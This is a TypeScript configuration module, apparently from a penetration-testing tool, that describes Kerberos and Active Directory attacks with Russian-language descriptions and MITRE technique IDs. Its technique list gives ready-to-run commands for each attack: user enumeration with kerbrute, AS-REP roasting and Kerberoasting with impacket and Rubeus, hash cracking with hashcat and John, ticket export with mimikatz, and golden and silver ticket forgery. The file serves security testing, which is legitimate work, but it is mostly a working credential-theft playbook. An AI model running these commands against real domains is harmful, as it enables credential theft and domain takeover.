/**
 * Kerberos Service Configuration
 * Kerberos Authentication Protocol
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const kerberosConfig: ServiceConfig = {
  id: 'kerberos',
  name: 'Kerberos',
  description: 'Kerberos - сетевой протокол аутентификации на основе билетов. Основной механизм аутентификации в Active Directory. Критически важен для понимания атак на AD: Kerberoasting, AS-REP Roasting, Pass-the-Ticket.',
  categoryId: 'directory',
  version: '1.0.0',
  tags: ['directory', 'kerberos', 'authentication', 'active-directory', 'windows'],

  matchers: {
    serviceNames: ['kerberos', 'kerberos-sec', 'kpasswd'],
    cpePatterns: ['cpe:/a:mit:kerberos', 'cpe:/a:microsoft:kerberos'],
    bannerRegex: [
      'Kerberos',
    ],
    productPatterns: ['MIT Kerberos', 'Heimdal Kerberos', 'Microsoft Kerberos'],
    standardPorts: [88, 464, 749], // Kerberos, kpasswd, admin
    nseScriptMatchers: [
      { scriptName: 'krb5-enum-users', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 40,

  techniques: [
    {
      id: 'kerberos-enum-users',
      name: 'Kerberos User Enumeration',
      mitreId: 'T1087.002',
      description: 'Перечисление пользователей через Kerberos без аутентификации.',
      commands: [
        { tool: 'kerbrute', command: 'kerbrute userenum -d domain.local users.txt --dc <target>', description: 'Kerbrute user enum' },
        { tool: 'nmap', command: 'nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=\'domain.local\' <target>', description: 'NSE Kerberos enum' },
        { tool: 'kerberoast', command: 'python kerberoast.py -domain domain.local -users users.txt -dc-ip <target>', description: 'Kerberoast enum' },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'users', 'reconnaissance'],
    },
    {
      id: 'kerberos-asreproast',
      name: 'AS-REP Roasting',
      mitreId: 'T1558.004',
      description: 'Получение AS-REP для пользователей с отключенным Pre-Auth и оффлайн-брутфорс.',
      commands: [
        { tool: 'impacket-GetNPUsers', command: 'GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast', description: 'GetNPUsers AS-REP roast' },
        { tool: 'rubeus', command: 'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt', description: 'Rubeus AS-REP roast' },
        { tool: 'hashcat', command: 'hashcat -m 18200 hashes.asreproast wordlist.txt', description: 'Crack AS-REP hashes' },
      ],
      difficulty: 'medium',
      prerequisites: ['Пользователи с DONT_REQ_PREAUTH'],
      tags: ['kerberoasting', 'credential-theft', 'offline-crack'],
    },
    {
      id: 'kerberos-kerberoast',
      name: 'Kerberoasting',
      mitreId: 'T1558.003',
      description: 'Получение TGS для сервисных аккаунтов и оффлайн-брутфорс их паролей.',
      commands: [
        { tool: 'impacket-GetUserSPNs', command: 'GetUserSPNs.py domain.local/user:password -request -outputfile hashes.kerberoast', description: 'GetUserSPNs Kerberoast' },
        { tool: 'rubeus', command: 'Rubeus.exe kerberoast /outfile:hashes.txt', description: 'Rubeus Kerberoast' },
        { tool: 'hashcat', command: 'hashcat -m 13100 hashes.kerberoast wordlist.txt', description: 'Crack Kerberoast hashes' },
        { tool: 'john', command: 'john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast', description: 'John the Ripper crack' },
      ],
      difficulty: 'medium',
      prerequisites: ['Любой валидный пользователь домена'],
      tags: ['kerberoasting', 'credential-theft', 'service-accounts'],
    },
    {
      id: 'kerberos-golden-ticket',
      name: 'Golden Ticket Attack',
      mitreId: 'T1558.001',
      description: 'Создание Golden Ticket с KRBTGT хэшем для полного контроля домена.',
      commands: [
        { tool: 'mimikatz', command: 'kerberos::golden /domain:domain.local /sid:S-1-5-21-... /krbtgt:ntlmhash /user:Administrator', description: 'Create golden ticket' },
        { tool: 'mimikatz', command: 'kerberos::ptt ticket.kirbi', description: 'Pass the ticket' },
        { tool: 'impacket-ticketer', command: 'ticketer.py -nthash krbgtgt_hash -domain-sid S-1-5-21-... -domain domain.local Administrator', description: 'Impacket golden ticket' },
      ],
      difficulty: 'hard',
      prerequisites: ['KRBTGT NTLM хэш', 'Domain SID'],
      tags: ['golden-ticket', 'persistence', 'domain-admin'],
    },
    {
      id: 'kerberos-silver-ticket',
      name: 'Silver Ticket Attack',
      mitreId: 'T1558.002',
      description: 'Создание Silver Ticket для доступа к конкретному сервису.',
      commands: [
        { tool: 'mimikatz', command: 'kerberos::golden /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:HOST /rc4:service_nthash /user:Administrator', description: 'Create silver ticket' },
        { tool: 'impacket-ticketer', command: 'ticketer.py -nthash service_hash -domain-sid S-1-5-21-... -domain domain.local -spn HOST/server.domain.local Administrator', description: 'Impacket silver ticket' },
      ],
      difficulty: 'hard',
      prerequisites: ['Service account NTLM хэш', 'Domain SID'],
      tags: ['silver-ticket', 'lateral-movement', 'persistence'],
    },
    {
      id: 'kerberos-pass-the-ticket',
      name: 'Pass the Ticket',
      mitreId: 'T1550.003',
      description: 'Использование украденных Kerberos билетов для аутентификации.',
      commands: [
        { tool: 'mimikatz', command: 'sekurlsa::tickets /export', description: 'Export tickets from memory' },
        { tool: 'mimikatz', command: 'kerberos::ptt ticket.kirbi', description: 'Pass the ticket' },
        { tool: 'rubeus', command: 'Rubeus.exe ptt /ticket:base64ticket', description: 'Rubeus PTT' },
      ],
      difficulty: 'medium',
      prerequisites: ['Доступ к памяти процесса', 'Извлеченные билеты'],
      tags: ['pass-the-ticket', 'lateral-movement', 'credential-use'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'key',
    color: '#dc2626',
    displayPriority: 95,
  },

  references: [
    { title: 'Kerberos Attacks', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88' },
    { title: 'Kerberoasting', url: 'https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast' },
  ],

  notes: 'Kerberos - основа AD-безопасности. Kerberoasting - одна из самых популярных атак. Всегда проверяйте Pre-Auth disabled пользователей (AS-REP Roasting). KRBTGT = полный контроль домена.',
};

export default kerberosConfig;
